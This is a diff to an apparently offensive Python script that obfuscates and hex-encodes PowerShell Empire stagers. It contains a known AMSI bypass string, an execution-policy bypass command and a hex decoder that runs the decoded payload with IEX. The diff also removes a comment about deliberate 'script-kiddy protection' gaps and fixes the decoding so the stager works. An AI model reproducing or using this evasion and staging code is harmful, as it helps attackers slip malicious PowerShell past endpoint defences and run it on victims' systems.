@@ -2,7 +2,6 @@
 #!/usr/bin/env python3
 
 # Spice up and convert to hex, for Empire stagers - so they work properly
-# Contains intentional gaps and issues as script-kiddy protection
 # Not fully finished, a few features will come
 
 import argparse
@@ -45,7 +44,7 @@ def construct_powershell_command(source_str):
     replace_Amsi = "[ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('AmsiInitFailed', 'NonPublic, Static').SetValue($null,$true);".lower()
     amsiEvasion = '<...enter working evasion...>'
     execution_policy = 'Set-ExecutionPolicy Bypass -Scope Process' 
-    decoder = f'$hexString="{source_str}";$text = [System.Text.Encoding]::ASCII.GetString([byte[]] -split ($hexString -replace "..", "0x$& "));IEX $text'
+    decoder = f'$hexString="{source_str}";$text = [System.Text.Encoding]::Unicode.GetString([byte[]] -split ($hexString -replace "..", "0x$& "));IEX $text'
 
     # If evasion is already inside, replace it with a working one
     if replace_Amsi in source_str.lower():
